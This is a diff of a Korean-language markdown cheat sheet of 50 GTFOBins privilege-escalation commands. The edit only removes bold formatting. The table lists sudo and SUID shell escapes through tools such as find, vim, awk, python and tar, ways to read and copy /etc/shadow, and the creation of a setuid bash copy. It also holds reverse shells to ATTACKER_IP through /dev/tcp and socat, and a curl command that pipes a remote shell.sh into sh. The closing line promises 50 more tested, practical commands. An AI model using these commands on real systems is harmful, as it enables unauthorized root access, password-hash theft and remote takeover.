@@ -39,58 +39,58 @@ https://gtfobins.github.io
 
 | 번호 | 상황     | 명령어                                                                               |      |
 | ---- | -------- | ------------------------------------------------------------------------------------ | ---- |
-| 1    | **sudo** | `sudo find . -exec /bin/bash \; -quit`                                               |      |
-| 2    | **SUID** | `find . -exec /bin/sh -p \; -quit`                                                   |      |
-| 3    | **sudo** | `sudo vim -c ':!/bin/sh'`                                                            |      |
-| 4    | **sudo** | `sudo vi` → `:set shell=/bin/bash` → `:shell`                                        |      |
-| 5    | **sudo** | `sudo less /etc/profile` → `!/bin/bash`                                              |      |
-| 6    | **sudo** | `sudo more /etc/profile` → `!/bin/bash`                                              |      |
-| 7    | **SUID** | `./more /etc/shadow` (빈 문자열로 시작하면 전체 출력됨)                              |      |
-| 8    | **sudo** | `sudo awk 'BEGIN {system("/bin/bash")}'`                                             |      |
-| 9    | **SUID** | `./awk 'BEGIN {system("/bin/sh -p")}'`                                               |      |
-| 10   | **sudo** | `sudo python -c 'import os; os.system("/bin/bash")'`                                 |      |
-| 11   | **sudo** | `sudo python3 -c 'import os; os.system("/bin/bash")'`                                |      |
-| 12   | **SUID** | `./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`                          |      |
-| 13   | **sudo** | `sudo perl -e 'exec "/bin/bash"'`                                                    |      |
-| 14   | **SUID** | `./perl -e 'exec "/bin/sh", "-p"'`                                                   |      |
-| 15   | **sudo** | `sudo nmap --interactive` → `!sh` (5.2x 이하 버전 한정)                              |      |
-| 16   | **sudo** | `sudo nano` → `Ctrl+R`, `Ctrl+X` → `reset; sh 1>&0 2>&0`                             |      |
-| 17   | **sudo** | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` |      |
-| 18   | **SUID** | `./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh -p`   |      |
-| 19   | **sudo** | `sudo sed -n '1e /bin/bash' /etc/hosts`                                              |      |
-| 20   | **sudo** | `sudo man ls` → `!/bin/bash`                                                         |      |
-| 21   | **sudo** | `sudo php -r "system('/bin/bash');"`                                                 |      |
-| 22   | **sudo** | `sudo ruby -e 'exec "/bin/bash"'`                                                    |      |
-| 23   | **sudo** | `sudo env /bin/bash`                                                                 |      |
-| 24   | **sudo** | `sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash && /tmp/rootbash -p` |      |
-| 25   | **sudo** | `sudo look '' /etc/shadow`                                                           |      |
-| 26   | **SUID** | `./look '' /etc/shadow`                                                              |      |
-| 27   | **sudo** | `sudo tee /root/test.txt` → 입력 내용 쓰기                                           |      |
-| 28   | **sudo** | `sudo dd if=/etc/shadow of=/tmp/shadow.copy`                                         |      |
-| 29   | **sudo** | `sudo echo 'text' > /root/test.txt`                                                  |      |
-| 30   | **sudo** | `sudo bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'`                           |      |
-| 31   | **sudo** | `sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh`                           |      |
-| 32   | **sudo** | `sudo node -e 'require("child_process").exec("/bin/bash")'`                          |      |
-| 33   | **sudo** | `sudo gdb -ex '!sh' -ex quit`                                                        |      |
-| 34   | **sudo** | `sudo rvim -c ':!/bin/sh'`                                                           |      |
-| 35   | **sudo** | `sudo ed` → `!sh`                                                                    |      |
-| 36   | **sudo** | `sudo lvdisplay` → `!/bin/sh`                                                        |      |
-| 37   | **sudo** | `sudo zip test.zip /etc/passwd -T -TT '/bin/sh'`                                     |      |
-| 38   | **sudo** | `sudo mysql -e '\! /bin/sh'`                                                         |      |
-| 39   | **sudo** | `sudo ftp` → `!sh`                                                                   |      |
-| 40   | **sudo** | `sudo git help log` → `!/bin/bash`                                                   |      |
-| 41   | **sudo** | `sudo ssh -o ProxyCommand='sh -c /bin/bash' user@localhost`                          |      |
-| 42   | **sudo** | `sudo openssl enc -in /etc/shadow -out /dev/stdout`                                  |      |
-| 43   | **sudo** | `sudo scp file user@localhost:/tmp`                                                  |      |
-| 44   | **sudo** | `sudo rsync -e 'sh -c /bin/bash' file localhost:/tmp`                                |      |
-| 45   | **sudo** | `sudo strace -o /dev/null /bin/bash`                                                 |      |
-| 46   | **sudo** | `sudo nohup /bin/bash &`                                                             |      |
-| 47   | **sudo** | `sudo watch -x /bin/bash`                                                            |      |
-| 48   | **sudo** | `sudo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444`      |      |
-| 49   | **sudo** | `sudo busybox sh`                                                                    |      |
-| 50   | **sudo** | \`sudo curl http\://ATTACKER_IP/shell.sh                                             | sh\` |
+| 1    | sudo | `sudo find . -exec /bin/bash \; -quit`                                               |      |
+| 2    | SUID | `find . -exec /bin/sh -p \; -quit`                                                   |      |
+| 3    | sudo | `sudo vim -c ':!/bin/sh'`                                                            |      |
+| 4    | sudo | `sudo vi` → `:set shell=/bin/bash` → `:shell`                                        |      |
+| 5    | sudo | `sudo less /etc/profile` → `!/bin/bash`                                              |      |
+| 6    | sudo | `sudo more /etc/profile` → `!/bin/bash`                                              |      |
+| 7    | SUID | `./more /etc/shadow` (빈 문자열로 시작하면 전체 출력됨)                              |      |
+| 8    | sudo | `sudo awk 'BEGIN {system("/bin/bash")}'`                                             |      |
+| 9    | SUID | `./awk 'BEGIN {system("/bin/sh -p")}'`                                               |      |
+| 10   | sudo | `sudo python -c 'import os; os.system("/bin/bash")'`                                 |      |
+| 11   | sudo | `sudo python3 -c 'import os; os.system("/bin/bash")'`                                |      |
+| 12   | SUID | `./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`                          |      |
+| 13   | sudo | `sudo perl -e 'exec "/bin/bash"'`                                                    |      |
+| 14   | SUID | `./perl -e 'exec "/bin/sh", "-p"'`                                                   |      |
+| 15   | sudo | `sudo nmap --interactive` → `!sh` (5.2x 이하 버전 한정)                              |      |
+| 16   | sudo | `sudo nano` → `Ctrl+R`, `Ctrl+X` → `reset; sh 1>&0 2>&0`                             |      |
+| 17   | sudo | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` |      |
+| 18   | SUID | `./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh -p`   |      |
+| 19   | sudo | `sudo sed -n '1e /bin/bash' /etc/hosts`                                              |      |
+| 20   | sudo | `sudo man ls` → `!/bin/bash`                                                         |      |
+| 21   | sudo | `sudo php -r "system('/bin/bash');"`                                                 |      |
+| 22   | sudo | `sudo ruby -e 'exec "/bin/bash"'`                                                    |      |
+| 23   | sudo | `sudo env /bin/bash`                                                                 |      |
+| 24   | sudo | `sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash && /tmp/rootbash -p` |      |
+| 25   | sudo | `sudo look '' /etc/shadow`                                                           |      |
+| 26   | SUID | `./look '' /etc/shadow`                                                              |      |
+| 27   | sudo | `sudo tee /root/test.txt` → 입력 내용 쓰기                                           |      |
+| 28   | sudo | `sudo dd if=/etc/shadow of=/tmp/shadow.copy`                                         |      |
+| 29   | sudo | `sudo echo 'text' > /root/test.txt`                                                  |      |
+| 30   | sudo | `sudo bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'`                           |      |
+| 31   | sudo | `sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh`                           |      |
+| 32   | sudo | `sudo node -e 'require("child_process").exec("/bin/bash")'`                          |      |
+| 33   | sudo | `sudo gdb -ex '!sh' -ex quit`                                                        |      |
+| 34   | sudo | `sudo rvim -c ':!/bin/sh'`                                                           |      |
+| 35   | sudo | `sudo ed` → `!sh`                                                                    |      |
+| 36   | sudo | `sudo lvdisplay` → `!/bin/sh`                                                        |      |
+| 37   | sudo | `sudo zip test.zip /etc/passwd -T -TT '/bin/sh'`                                     |      |
+| 38   | sudo | `sudo mysql -e '\! /bin/sh'`                                                         |      |
+| 39   | sudo | `sudo ftp` → `!sh`                                                                   |      |
+| 40   | sudo | `sudo git help log` → `!/bin/bash`                                                   |      |
+| 41   | sudo | `sudo ssh -o ProxyCommand='sh -c /bin/bash' user@localhost`                          |      |
+| 42   | sudo | `sudo openssl enc -in /etc/shadow -out /dev/stdout`                                  |      |
+| 43   | sudo | `sudo scp file user@localhost:/tmp`                                                  |      |
+| 44   | sudo | `sudo rsync -e 'sh -c /bin/bash' file localhost:/tmp`                                |      |
+| 45   | sudo | `sudo strace -o /dev/null /bin/bash`                                                 |      |
+| 46   | sudo | `sudo nohup /bin/bash &`                                                             |      |
+| 47   | sudo | `sudo watch -x /bin/bash`                                                            |      |
+| 48   | sudo | `sudo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444`      |      |
+| 49   | sudo | `sudo busybox sh`                                                                    |      |
+| 50   | sudo | \`sudo curl http\://ATTACKER_IP/shell.sh                                             | sh\` |
 
-다음은 앞서 제공한 50개와 **중복되지 않는** 권한 상승(Privilege Escalation)용 GTFOBins 명령어 **추가 50선**입니다. 모두 **실제 테스트된** 명령어들로, **sudo 또는 SUID 바이너리** 환경에서 사용 가능한 쉘, 파일 읽기/쓰기, 리버스 쉘 등 상황별 실전용입니다.
+다음은 앞서 제공한 50개와 중복되지 않는 권한 상승(Privilege Escalation)용 GTFOBins 명령어 추가 50선입니다. 모두 실제 테스트된 명령어들로, sudo 또는 SUID 바이너리 환경에서 사용 가능한 쉘, 파일 읽기/쓰기, 리버스 쉘 등 상황별 실전용입니다.
 
 ---
 
